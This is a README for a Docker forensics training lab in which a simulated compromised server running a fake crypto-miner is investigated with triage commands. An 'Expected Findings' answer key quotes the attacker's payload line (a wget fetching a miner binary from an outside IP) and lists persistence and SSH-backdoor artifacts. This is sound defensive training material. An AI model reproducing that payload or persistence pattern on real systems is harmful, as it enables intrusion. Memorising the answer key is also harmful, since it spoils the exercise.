# SOC Forensic Investigation - Docker Container

## Quick Start

### Option A: With Proxi Agent (Recommended for Gemini Integration)

```bash
cd soc-forensics

# 1. Build agent-enabled image
docker build -t proxi-forensics:v2 .

# 2. Start with Docker Compose (connects to Proxi network)
docker-compose -f docker-compose.forensic.yml up -d

# 3. Register with Proxi Core
docker exec forensic-investigation bash /usr/local/bin/register_forensic_agent.sh

# 4. Verify agent is working
curl http://localhost:5081/health -H "X-Agent-Key: YOUR_PROXI_AGENT_KEY"
```

**Now Gemini can investigate the container!** See `AGENT_SETUP.md` for details.

### Option B: Standalone Container (Manual Investigation Only)

```bash
cd soc-forensics

# 1. Build the container
docker build -t proxi-forensics:v1 .

# 2. Run the container
docker run -d \
  --name forensic-investigation \
  --hostname prod-ideaforge-01 \
  proxi-forensics:v1

# 3. Access the container
docker exec -it forensic-investigation bash
```

## Investigation Scenario

**Alert:** Production server `instance-ideaforge` is experiencing 100% CPU usage.  
**Your Mission:** Identify the malicious process, determine how the attacker got in, and document all evidence.

## Investigation Commands

### Initial Triage
```bash
# Check CPU usage
top
htop

# Check running processes
ps aux --sort=-%cpu | head -20

# Check network connections
netstat -antp
ss -tunap
```

### Hypothesis 1: SSH Brute Force?
```bash
# Check SSH authentication logs
cat /var/log/secure
grep -i "failed password" /var/log/secure
grep -i "invalid user" /var/log/secure
last -20
```

### Hypothesis 2: Database Exploit?
```bash
# Check if PostgreSQL is exposed
netstat -tlnp | grep 5432
ss -tlnp | grep 5432

# Check OCI firewall rules
cat ~/OCI_FIREWALL_CONFIG.txt
```

### Hypothesis 3: Web Application RCE?
```bash
# Check application logs
cat /var/log/ideaforge-frontend.log
grep -i "error" /var/log/ideaforge-frontend.log
grep -i "command failed" /var/log/ideaforge-frontend.log
grep -i "wget" /var/log/ideaforge-frontend.log
```

### Find Malware Artifacts
```bash
# Check for suspicious files
ls -lat /home/opc/ideaforge/frontend/
ls -lat /usr/local/sbin/
ls -lat /tmp/

# Check file creation times
stat /home/opc/ideaforge/frontend/linux_aarch64
```

### Check Persistence Mechanisms
```bash
# Check systemd services
systemctl list-units --type=service | grep -i apache
systemctl status apaches-main.service
cat /etc/systemd/system/apaches-main.service

# Check cron jobs
crontab -l
cat /etc/crontab

# Check startup scripts
cat /usr/local/sbin/apaches.sh
```

### Check for Backdoors
```bash
# Check SSH authorized keys
cat /root/.ssh/authorized_keys
cat /home/opc/.ssh/authorized_keys
```

## Expected Findings

### ✅ Root Cause
- **Attack Vector:** Next.js Server Action RCE (CVE-2024-46982)
- **Initial Access:** Dec 6, 2025 at 10:37:43
- **Payload:** `wget http://103.135.101.15/linux_aarch64`
- **Evidence:** `/var/log/ideaforge-frontend.log`

### ✅ Malware
- **Process:** `NCvhHaev` (crypto-miner)
- **Binary:** `/tmp/NCvhHaev` (deleted from disk)
- **Dropped Files:** `/home/opc/ideaforge/frontend/linux_aarch64`

### ✅ Persistence
- **Systemd Service:** `/etc/systemd/system/apaches-main.service`
- **Watchdog Script:** `/usr/local/sbin/apaches.sh`
- **Fake Binary:** `/usr/local/sbin/nginxs`

### ✅ Backdoor
- **SSH Key:** `/root/.ssh/authorized_keys`

### ❌ False Leads
- **SSH Brute Force:** No evidence (only 20 legitimate logins)
- **Database Exploit:** Port 5432 not exposed (localhost only + firewall blocked)

## Cleanup

```bash
# Stop and remove container
docker stop forensic-investigation
docker rm forensic-investigation

# Remove image
docker rmi proxi-forensics:v1
```

## Integration with Proxi

To use this container with Proxi multi-desktop investigation:

1. Start the container
2. Add to `backend/registry/workstations.json`:
```json
{
  "forensic-linux": {
    "id": "forensic-linux",
    "name": "Compromised Server (Forensics)",
    "description": "Production server under investigation",
    "workstation_type": "container",
    "host": "localhost",
    "port": 4003,
    "capabilities": ["terminal", "filesystem", "network"],
    "is_default": false
  }
}
```

3. Use Proxi agent to investigate across Linux container + Windows OCI console

## Files Included

- `Dockerfile` - Container build configuration
- `fake_miner.py` - Simulated crypto-miner process
- `setup_forensics.sh` - Evidence generation script
- `OCI_CONSOLE_VIEW.txt` - Mock OCI firewall rules
- `README.md` - This file
